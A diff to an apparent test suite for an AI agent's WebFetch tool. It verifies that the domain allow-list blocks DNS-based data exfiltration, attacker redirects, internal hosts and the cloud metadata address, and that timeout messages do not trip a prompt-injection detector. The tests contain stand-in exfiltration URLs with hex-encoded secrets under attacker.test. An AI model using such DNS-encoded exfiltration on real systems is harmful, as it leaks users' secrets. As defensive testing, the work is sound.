@@ -1,4 +1,6 @@
 import { afterEach, beforeEach, describe, expect, mock, spyOn, test } from "bun:test";
+import { classifyText } from "@crewhaus/prompt-injection-detector";
+import { executeTool } from "@crewhaus/tool-executor";
 import {
   WebFetchPermissionError,
   _resetWebFetchConfig,
@@ -169,6 +171,82 @@ describe("T8 — WebFetch scheme + allow-list", () => {
       async () => new Response("ok", { status: 200, headers: { "content-type": "text/plain" } }),
     );
     await expect(webFetch.execute({ url: "https://EXAMPLE.com/" })).resolves.toBeDefined();
+  });
+});
+
+// A DNS lookup is egress: `<hex-of-a-secret>.attacker.test` reaches the
+// attacker's name server whether or not anything connects. 0.7.0 resolved
+// the host (the SSRF guard) before checking allowed_domains, on the first
+// request and on every redirect hop, so the allow-list did not stop that.
+describe("WebFetch — allow-list is checked before DNS (C028)", () => {
+  const recordLookups = (address = "93.184.216.34"): string[] => {
+    const looked: string[] = [];
+    _setDnsLookup(async (host: string) => {
+      looked.push(host);
+      return { address, family: 4 };
+    });
+    return looked;
+  };
+
+  test("a host outside allowed_domains is refused without being resolved", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups();
+    _setRawFetch(async () => {
+      throw new Error("must not fetch");
+    });
+    await expect(
+      webFetch.execute({ url: "https://73656372.exfil.attacker.test/" }),
+    ).rejects.toThrow(/not in allowed_domains/);
+    expect(looked).toEqual([]);
+  });
+
+  test("a redirect to a host outside allowed_domains is refused without being resolved", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups();
+    _setRawFetch(async (req: Request) =>
+      new URL(req.url).hostname === "example.com"
+        ? new Response(null, {
+            status: 302,
+            headers: { location: "https://c2vjcmv0.attacker.test/" },
+          })
+        : new Response("ok", { status: 200 }),
+    );
+    await expect(webFetch.execute({ url: "https://example.com/" })).rejects.toThrow(
+      /not in allowed_domains/,
+    );
+    expect(looked).toEqual(["example.com"]);
+  });
+
+  test("a per-call allow-list is checked before DNS too", async () => {
+    const looked = recordLookups();
+    _setRawFetch(async () => {
+      throw new Error("must not fetch");
+    });
+    await expect(
+      webFetch.execute({ url: "https://leak3.attacker.test/" }, {
+        toolConfig: { allowed_domains: ["example.com"] },
+      } as never),
+    ).rejects.toThrow(/not in allowed_domains/);
+    expect(looked).toEqual([]);
+  });
+
+  test("an internal host outside the list is refused by the list, and its address is never learned", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups("10.65.66.67");
+    const error = await webFetch.execute({ url: "https://db.internal.corp/" }).then(
+      () => null,
+      (e: unknown) => e as Error,
+    );
+    expect(error?.message).toMatch(/not in allowed_domains/);
+    expect(error?.message).not.toContain("10.65.66.67");
+    expect(looked).toEqual([]);
+  });
+
+  test("an allow-listed host is still resolved and still refused when it resolves privately", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups("169.254.169.254");
+    await expect(webFetch.execute({ url: "https://example.com/" })).rejects.toThrow(/private/i);
+    expect(looked).toEqual(["example.com"]);
   });
 });
 
@@ -657,7 +735,7 @@ describe("WebFetch — ctx.signal cancellation wiring", () => {
 
   test("the fetch-timeout setTimeout callback aborts the controller when fired", async () => {
     // Capture the timeout callback instead of waiting 30s, then invoke it by
-    // hand so its body (ctrl.abort(new Error("fetch timeout"))) is exercised
+    // hand so its body (the abort with the timed-out reason) is exercised
     // deterministically — no real timer, no leaked handle.
     const captured: Array<() => void> = [];
     const setSpy = spyOn(globalThis, "setTimeout").mockImplementation(((fn: () => void) => {
@@ -840,4 +918,53 @@ describe("private-address classifier — spelling matrix", () => {
       expect(isPrivateIp(address)).toBe(false);
     });
   }
+});
+
+describe("WebFetch's timeout is not read as a prompt injection", () => {
+  test("the timed-out result says why, and is not read as an order", async () => {
+    // The stub holds the request open until the tool's own timer aborts it;
+    // the timer is fired by hand, so nothing races a real clock.
+    let reached: () => void = () => undefined;
+    const inFlight = new Promise<void>((resolve) => {
+      reached = resolve;
+    });
+    _setRawFetch(
+      (req) =>
+        new Promise<Response>((_resolve, reject) => {
+          req.signal.addEventListener("abort", () => reject(req.signal.reason), { once: true });
+          reached();
+        }),
+    );
+    const captured: Array<() => void> = [];
+    const setSpy = spyOn(globalThis, "setTimeout").mockImplementation(((fn: () => void) => {
+      captured.push(fn);
+      return 0 as unknown as ReturnType<typeof setTimeout>;
+    }) as typeof setTimeout);
+    const clearSpy = spyOn(globalThis, "clearTimeout").mockImplementation(
+      (() => {}) as typeof clearTimeout,
+    );
+    let content = "";
+    try {
+      const pending = executeTool(
+        webFetch,
+        { url: "https://example.com/slow", prompt: "x" },
+        { toolUseId: "t" },
+      );
+      await inFlight;
+      for (const fn of captured) fn();
+      const result = await pending;
+      expect(result.isError).toBe(true);
+      content = String(result.content);
+    } finally {
+      setSpy.mockRestore();
+      clearSpy.mockRestore();
+    }
+    expect(content).toBe("the request timed out after 30000ms");
+    // 0.7.0 answered "fetch timeout", which the trailing-imperative rule
+    // flags; the check below proves the detector is live, not just lenient.
+    expect([
+      (await classifyText(content)).classification,
+      (await classifyText("fetch timeout")).classification,
+    ]).toEqual(["clean", "suspicious"]);
+  });
 });
